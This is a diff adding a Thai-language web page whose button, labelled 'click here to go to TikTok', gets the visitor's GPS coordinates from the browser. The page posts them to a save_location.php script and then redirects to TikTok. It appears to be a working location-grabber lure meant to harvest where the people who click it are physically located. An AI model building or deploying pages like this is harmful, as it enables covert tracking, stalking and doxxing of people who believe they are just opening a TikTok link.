@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ติดตามพิกัดและไป TikTok</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    // ส่งข้อมูลพิกัดไปยัง server (save_location.php)
+                    fetch('save_location.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: `latitude=${latitude}&longitude=${longitude}`
+                    }).then(response => {
+                        if (response.ok) {
+                            // หลังจากบันทึกพิกัดแล้วให้ไปที่ TikTok
+                            window.location.href = 'https://www.tiktok.com';
+                        }
+                    });
+                }, function(error) {
+                    alert("ไม่สามารถเข้าถึงพิกัดของคุณได้");
+                });
+            } else {
+                alert("เบราว์เซอร์ของคุณไม่รองรับการขอพิกัด");
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>คลิกเพื่อติดตามพิกัดและไป TikTok</h1>
+    <button onclick="getLocation()">📍 คลิกที่นี่เพื่อไป TikTok</button>
+</body>
+</html>
